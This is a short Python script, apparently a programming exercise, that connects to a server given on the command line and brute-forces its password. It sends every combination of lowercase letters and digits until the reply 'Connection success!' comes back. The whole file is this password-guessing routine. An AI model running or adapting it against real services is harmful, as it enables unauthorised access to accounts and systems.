def hack(ip, port):
    import socket
    hack_sock = socket.socket()
    address = (ip, int(port))
    hack_sock.connect(address)
    nums = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    import string
    alphabet_list = list(string.ascii_lowercase) + nums
    import itertools
    counter = 1
    x = 0
    while x == 0:
        for psy in itertools.product(alphabet_list, repeat=counter):
            pw = ''.join(psy)
            pwd = pw.encode()
            hack_sock.send(pwd)
            response = hack_sock.recv(1024)
            response = response.decode()
            if response == "Connection success!":
                print(pw)
                x = 1
                break
        counter += 1
    hack_sock.close()

import sys

args = sys.argv
hack(args[1], args[2])